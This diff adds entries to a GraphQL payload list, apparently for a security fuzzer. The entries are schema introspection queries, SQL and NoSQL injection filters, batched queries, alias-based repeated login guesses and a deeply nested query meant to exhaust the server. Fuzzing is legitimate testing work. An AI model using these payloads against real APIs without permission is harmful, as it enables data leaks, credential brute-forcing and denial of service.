@@ -1,0 +1,9 @@
+# DEEPHUNT payload class: graphql (Wave 1 additions, 2026-09-27)
+# Shapes are pattern families; the fuzzer instantiates them.
+{__schema{types{name}}}
+query { __type(name: "User") { fields { name } } }
+{ users(filter: "admin'--") { id } }
+{ users(filter: "{$gt: \"\"}") { id } }
+[{query:"{a}"},{query:"{b}"}]
+{ a1: login(u:"x",p:"1"){ok} a2: login(u:"x",p:"2"){ok} }
+{ user(id:1){ friends{ friends{ friends{ name }}}}}
